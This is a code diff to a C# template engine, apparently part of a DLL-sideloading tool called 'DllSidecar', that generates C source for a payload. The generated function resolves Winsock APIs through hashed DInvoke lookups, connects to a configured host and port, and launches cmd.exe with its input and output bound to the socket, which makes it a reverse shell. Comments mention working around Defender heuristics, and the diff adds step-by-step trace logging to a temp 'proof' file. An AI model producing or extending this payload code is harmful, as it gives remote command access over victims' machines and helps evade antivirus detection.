@@ -959,11 +959,53 @@ public static class TemplateEngine
         // Network-order port: byte-swap host→network at template time.
         ushort nport = (ushort)(((port & 0xFF) << 8) | ((port >> 8) & 0xFF));
 
-        var proof = config.WriteProofFile ? GenerateProofFileSnippet() : "";
-
         var sb = new StringBuilder();
+        var traceEnabled = config.WriteProofFile;
+        var displayTarget = $"{host}:{port}";
+
+        // Inline trace helpers. They emit small fopen/fprintf/fclose blocks that
+        // reopen the proof file in "a" mode at each milestone — important because
+        // we can't keep one FILE* open across the WS2 calls (Defender heuristics
+        // on long-open temp file handles + the loader-lock paranoia from earlier).
+        void TraceStep(string label)
+        {
+            if (!traceEnabled) return;
+            sb.AppendLine($"    {{ FILE *_t = fopen(_proof_path, \"a\"); if (_t) {{ fprintf(_t, \"[step] {label}\\n\"); fclose(_t); }} }}");
+        }
+        void TraceOk(string label)
+        {
+            if (!traceEnabled) return;
+            sb.AppendLine($"    {{ FILE *_t = fopen(_proof_path, \"a\"); if (_t) {{ fprintf(_t, \"[ ok ] {label}\\n\"); fclose(_t); }} }}");
+        }
+        void TraceFail(string label, string errExpr, string indent = "    ")
+        {
+            if (!traceEnabled) return;
+            sb.AppendLine($"{indent}{{ int _err = {errExpr}; FILE *_t = fopen(_proof_path, \"a\"); if (_t) {{ fprintf(_t, \"[fail] {label} (last_error=%d)\\n\", _err); fclose(_t); }} }}");
+        }
+
         sb.AppendLine("static void do_payload(void) {");
-        if (!string.IsNullOrEmpty(proof)) sb.Append(proof);
+
+        // Proof file lifted to function scope so trace blocks below can reopen
+        // it. Header is written in "w" mode (overwrite); subsequent traces are
+        // "a" (append). When proof is off, no path is computed and no traces
+        // are emitted — produces the same lean binary as before.
+        if (traceEnabled)
+        {
+            sb.AppendLine("    char _proof_path[MAX_PATH], _proof_temp[MAX_PATH];");
+            sb.AppendLine("    GetTempPathA(MAX_PATH, _proof_temp);");
+            sb.AppendLine("    wsprintfA(_proof_path, \"%sdllsidecar_proof_%lu.txt\", _proof_temp, GetCurrentProcessId());");
+            sb.AppendLine("    { FILE *_f = fopen(_proof_path, \"w\");");
+            sb.AppendLine("      if (_f) {");
+            sb.AppendLine("          SYSTEMTIME _st; GetLocalTime(&_st);");
+            sb.AppendLine("          fprintf(_f, \"DllSidecar PoC — payload fired\\n\"");
+            sb.AppendLine("                      \"PID: %lu\\n\"");
+            sb.AppendLine("                      \"Timestamp: %04d-%02d-%02d %02d:%02d:%02d\\n\"");
+            sb.AppendLine($"                      \"Mode: Reverse Shell -> {displayTarget}\\n\\n\",");
+            sb.AppendLine("              GetCurrentProcessId(), _st.wYear, _st.wMonth, _st.wDay,");
+            sb.AppendLine("              _st.wHour, _st.wMinute, _st.wSecond);");
+            sb.AppendLine("          fclose(_f);");
+            sb.AppendLine("      } }");
+        }
 
         // ── API resolution ──
         // DInvoke uses dinvoke.h's H_* hash macros + fn_* typedefs. WS2_32
@@ -1026,20 +1068,36 @@ public static class TemplateEngine
         }
 
         // ── WSA init + socket + connect ──
+        TraceStep("WSAStartup");
         sb.AppendLine("    WSADATA wsa;");
-        sb.AppendLine("    if (pStartup(MAKEWORD(2,2), &wsa) != 0) return;");
+        sb.AppendLine("    if (pStartup(MAKEWORD(2,2), &wsa) != 0) {");
+        TraceFail("WSAStartup", "WSAGetLastError()", "        ");
+        sb.AppendLine("        return;");
+        sb.AppendLine("    }");
+        TraceOk("WSAStartup");
+
         // WSA_FLAG_OVERLAPPED = 0x01 — required for STARTF_USESTDHANDLES inheritance
         // to work cleanly on the child process. dwFlags=0 silently drops events.
+        TraceStep("WSASocketW");
         sb.AppendLine("    SOCKET s = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);");
-        sb.AppendLine("    if (s == INVALID_SOCKET) return;");
+        sb.AppendLine("    if (s == INVALID_SOCKET) {");
+        TraceFail("WSASocketW", "WSAGetLastError()", "        ");
+        sb.AppendLine("        return;");
+        sb.AppendLine("    }");
+        TraceOk("WSASocketW");
+
         sb.AppendLine("    struct sockaddr_in sa;");
         sb.AppendLine("    ZeroMemory(&sa, sizeof(sa));");
         sb.AppendLine("    sa.sin_family = AF_INET;");
         sb.AppendLine($"    sa.sin_port = 0x{nport:X4};   /* htons({port}) = 0x{nport:X4} */");
         sb.AppendLine($"    {sinAddrInit}");
+
+        TraceStep($"connect -> {displayTarget}");
         sb.AppendLine("    if (pConnect(s, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {");
+        TraceFail("connect", "WSAGetLastError()", "        ");
         sb.AppendLine("        pClose(s); return;");
         sb.AppendLine("    }");
+        TraceOk("connect");
 
         // ── Spawn cmd.exe with stdio bound to the socket ──
         // STARTUPINFOA + bInheritHandles=TRUE wires the child's stdin/stdout/stderr
@@ -1059,7 +1117,14 @@ public static class TemplateEngine
         sb.AppendLine("    si.hStdOutput = (HANDLE)s;");
         sb.AppendLine("    si.hStdError  = (HANDLE)s;");
         sb.AppendLine("    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));");
-        sb.AppendLine("    pCP(NULL, shell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);");
+
+        TraceStep("CreateProcessA cmd.exe (stdin/out/err -> socket)");
+        sb.AppendLine("    if (!pCP(NULL, shell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {");
+        TraceFail("CreateProcessA", "GetLastError()", "        ");
+        sb.AppendLine("        pClose(s); return;");
+        sb.AppendLine("    }");
+        TraceOk("CreateProcessA");
+
         sb.AppendLine("    if (pi.hProcess) CloseHandle(pi.hProcess);");
         sb.AppendLine("    if (pi.hThread)  CloseHandle(pi.hThread);");
         sb.AppendLine("}");
